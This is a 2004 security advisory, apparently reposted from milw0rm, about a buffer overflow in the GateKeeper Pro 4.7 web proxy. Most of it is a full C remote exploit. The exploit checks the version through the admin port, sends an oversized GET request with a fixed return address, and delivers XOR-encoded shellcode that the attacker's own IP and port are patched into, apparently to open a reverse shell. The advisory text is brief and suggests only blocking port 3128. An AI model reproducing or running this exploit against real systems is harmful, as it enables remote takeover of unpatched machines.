/*================[CRPT - FrenchTeam] =================*
  [Coromputer Security Advisory] - [CRPTSA-01]
 *=================== [Summary] =====================*
  Software : GateKeeper Pro 4.7
  Platforms : win32
  Risk : High
  Impact : Buffer overflow
  Release Date : 2004-02-23

 *=================== [Description] ====================*
  there is a trivial buffer overflow in the web proxy (default port 3128).

 *==================== [Details] ======================*
  Sending GET http://host.com/AAAAAAAAAA...(~4100bytes) will cause an access
  violation. Other services not tested, but they can be vulnerable too. Exact
  version can be checked from the administration service (default port 2000).

 *==================== [Exploits] ======================*
 /****************************************************/
 /* [Crpt]    GateKeeper Pro 4.7 remote sploit by kralor    [Crpt]  */
 /****************************************************/
 /* bug discovered & coded by: kralor [from coromputer]            */
 /* tested on: win2k pro and winXP                                          */
 /* it uses a static offset to hijack execution to the shellcode..    */
 /* so it is 100% universal. Nothing more to say..                      */
 /****************************************************/
 /*informations: www coromputer net irc undernet #coromputer    */
 /****************************************************/

 #include <stdio.h>
 #include <stdlib.h>
 #include <windows.h>
 #include <winsock.h>

 #pragma comment (lib,"ws2_32")

 #define PORT 3128
 #define ADMIN_PORT 2000
 #define VERSION "4.7.0"
 #define RET_POS 4079
 #define SIZE 4105
 #define RET_ADDR 0x03b1e121
 #define REQ  "GET http://www.microsoft.com/"
 #define REQ2 "\r\nHost: www.microsoft.com\r\n\r\n"
 // sequence of 4 opcodes
 #define HOP 0xd4 // host opcode
 #define POP 0xd7 // port opcode

 int cnx(char *host, int port)
 {
        int sock;
        struct sockaddr_in yeah;
        struct hostent *she;

        sock=socket(AF_INET,SOCK_STREAM,0);
        if(!sock) {
                printf("error: unable to create socket\r\n");
                return 0;
                }
        yeah.sin_family=AF_INET;
        yeah.sin_addr.s_addr=inet_addr(host);
        yeah.sin_port=htons((u_short)port);

 if((she=gethostbyname(host))!=NULL) {
        memcpy((char *)&yeah.sin_addr,she->h_addr,she->h_length);
        } else {
        if((yeah.sin_addr.s_addr=inet_addr(host))==INADDR_NONE) {
                printf("error: cannot resolve host\r\n");
                return 0;
                }
        }
        printf("[+] Connecting to %-30s ...",host);
        if(connect(sock,(struct sockaddr*)&yeah,sizeof(yeah))!=0) {
                printf("error: connection refused\r\n");
                return 0;
                }
        printf("Done\r\n");
        return sock;
 }


 void banner(void)
 {
        printf("\r\n\t  [Crpt] GateKeeper Pro 4.7 remote sploit by kralor [Crpt]\r\n");
        printf("\t\t www.coromputer.net && undernet #coromputer\r\n\r\n");
        return;
 }


 void syntax(char *prog)
 {
        printf("syntax: %s <host> <your_ip> <your_port>\r\n",prog);
        exit(0);
 }

 int main(int argc, char *argv[])
 {
        WSADATA wsaData;
        int sock;
        char buffer[1024],useme[SIZE],*ptr;
        unsigned long host,port;
        unsigned int i;
        char shellc0de[] =   /* sizeof(shellc0de+xorer) == 332 bytes */
        /* classic xorer */
        "\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5b\x80\xc3\x10\x33\xc9\x66"
        "\xb9\x33\x01\x80\x33\x95\x43\xe2\xfa"
        /* shellc0de */
        "\x1e\x61\xc0\xc3\xf1\x34\xa5"
        "\x95\x95\x95\x1e\xd5\x99\x1e\xe5\x89\x38\x1e\xfd\x9d\x7e\x95\x1e"
        "\x50\xcb\xc8\x1c\x93\x6a\xa3\xfd\x1b\xdb\x9b\x79\x7d\x38\x95\x95"
        "\x95\xfd\xa6\xa7\x95\x95\xfd\xe2\xe6\xa7\xca\xc1\x6a\x45\x1e\x6d"
        "\xc2\xfd\x4c\x9c\x60\x38\x7d\x06\x95\x95\x95\xa6\x5c\xc4\xc4\xc4"
        "\xc4\xd4\xc4\xd4\xc4\x6a\x45\x1c\xd3\xb1\xc2\xfd\x79\x6c\x3f\xf5"
        "\x7d\xec\x95\x95\x95\xfd\xd4\xd4\xd4\xd4\xfd\xd7\xd7\xd7\xd7\x1e"
        "\x59\xff\x85\xc4\x6a\xe3\xb1\x6a\x45\xfd\xf6\xf8\xf1\x95\x1c\xf3"
        "\xa5\x6a\xa3\xfd\xe7\x6b\x26\x83\x7d\xc4\x95\x95\x95\x1c\xd3\x8b"
        "\x16\x79\xc1\x18\xa9\xb1\xa6\x55\xa6\x5c\x16\x54\x80\x3e\x77\x68"
        "\x53\xd1\xb1\x85\xd1\x6b\xd1\xb1\xa8\x6b\xd1\xb1\xa9\x1e\xd3\xb1"
        "\x1c\xd1\xb1\xdd\x1c\xd1\xb1\xd9\x1c\xd1\xb1\xc5\x18\xd1\xb1\x85"
        "\xc1\xc5\xc4\xc4\xc4\xff\x94\xc4\xc4\x6a\xe3\xa5\xc4\x6a\xc3\x8b"
        "\x6a\xa3\xfd\x7a\x5b\x75\xf5\x7d\x97\x95\x95\x95\x6a\x45\xc6\xc0"
        "\xc3\xc2\x1e\xf9\xb1\x8d\x1e\xd0\xa9\x1e\xc1\x90\xed\x96\x40\x1e"
        "\xdf\x8d\x1e\xcf\xb5\x96\x48\x76\xa7\xdc\x1e\xa1\x1e\x96\x60\xa6"
        "\x6a\x69\xa6\x55\x39\xaf\x51\xe1\x92\x54\x5a\x98\x96\x6d\x7e\x67"
        "\xae\xe9\xb1\x81\xe0\x74\x1e\xcf\xb1\x96\x48\xf3\x1e\x99\xde\x1e"
        "\xcf\x89\x96\x48\x1e\x91\x1e\x96\x50\x7e\x97\xa6\x55\x1e\x40\xca"
        "\xcb\xc8\xce\x57\x91\x95";

        banner();

 if(argc!=4)
        syntax(argv[0]);
        host=inet_addr(argv[2])^0x95959595;
        port=atoi(argv[3]);
        if(port<=0||port>65535) {
                printf("error: <port> must be between 1 and 65535\r\n");
                return -1;
        }
        port=htons((unsigned short)port);
        port=port<<16;
        port+=0x0002;
        port=port^0x95959595;

 for(i=0;i<sizeof(shellc0de);i++) {
        if((unsigned char)shellc0de[i]==HOP&&(unsigned char)shellc0de[i+1]==HOP)
                if((unsigned char)shellc0de[i+2]==HOP&&(unsigned char)shellc0de[i+3]==HOP) {
                        memcpy(&shellc0de[i],&host,4);
                        host=0;
                        }
        if((unsigned char)shellc0de[i]==POP&&(unsigned char)shellc0de[i+1]==POP)
                if((unsigned char)shellc0de[i+2]==POP&&(unsigned char)shellc0de[i+3]==POP) {
                        memcpy(&shellc0de[i],&port,4);
                        port=0;
                        }
 }
 if(host||port) {
        printf("[i] error: unabled to find ip/port sequence in shellc0de\r\n");
        return -1;
        }

 if(WSAStartup(0x0101,&wsaData)!=0) {
        printf("[i] error: unable to load winsock\r\n");
        return -1;
        }
        printf("[-] Getting version through administration interface\r\n");
        sock=cnx(argv[1],ADMIN_PORT);
 if(!sock)
        printf("[i] warning: couldn't connect to admin int to get version, trying anyway\r\n");
 else {
        send(sock,"I'm a script kiddie\r\n",21,0);
        memset(buffer,0,sizeof(buffer));
        recv(sock,buffer,sizeof(buffer),0);
        memset(buffer,0,sizeof(buffer));
        recv(sock,buffer,sizeof(buffer),0);
        ptr=strstr(buffer,"GateKeeper@");
 if(!ptr)
        printf("[i] waring: version not found, trying anyway\r\n");
 else {
        ptr+=11;
        if(strncmp(ptr,VERSION,strlen(VERSION))) {
                printf("[i] error: wrong version\r\n");
                return -1;
        }
        printf("[i] %-44s ...OK\r\n","version");
        }
 }
        printf("[i] Starting to exploit\r\n");
        sock=cnx(argv[1],PORT);
 if(!sock)
        return -1;
        printf("[i] Preparing magic %-28s ...","packet");
        memset(useme,0x90,SIZE);
        memcpy(&useme[RET_POS-0x8ac],shellc0de,sizeof(shellc0de));
        *(unsigned long*)&useme[RET_POS] = RET_ADDR; // eip pointing to jmp ebx in exe memory
        memcpy(&useme[RET_POS+12],"\xe9\xed\xf6\xff\xff",5); // jmp $ - 0x92c
        printf("Done\r\n");
        printf("[i] Sending magic packet                         ...");
        send(sock,REQ,strlen(REQ),0);
        send(sock,useme,sizeof(useme),0);
        send(sock,REQ2,strlen(REQ2),0);
        printf("Done\r\n");
        closesocket(sock);
        return 0;
 }

 *================================= [Solutions] =================================*
  No solution, wait for Infopulse to read this advisory and release a patch.

 *================================= [Workaround] ================================*
  block undesired access to port 3128 (or uninstall the software and use a real
  proxy coded by real coders).

 *================================== [Credits] ==================================*
  Discovered and coded by Ivan Rodriguez Almuina <kralor@coromputer.net>

 *================================= [Disclaimer] ================================*
  The information within this paper may change without notice.
  Use of this information constitutes acceptance for use in an AS IS condition.
  There are NO warranties with to this information.
  In no event shall the author be liable for any damages whatsoever arising out
  of or in connection with the use or spread of this information.
  Any use of this information is at the user's own risk.

 *================================== [Feedback] =================================*
  Please send suggestions, updates, and comments to :
  irc : #coromputer on undernet
  url : http://www.coromputer.net
  mail : kralor@coromputer.net

\*============================\* www.coromputer.net */===========================*/

// milw0rm.com [2004-02-26]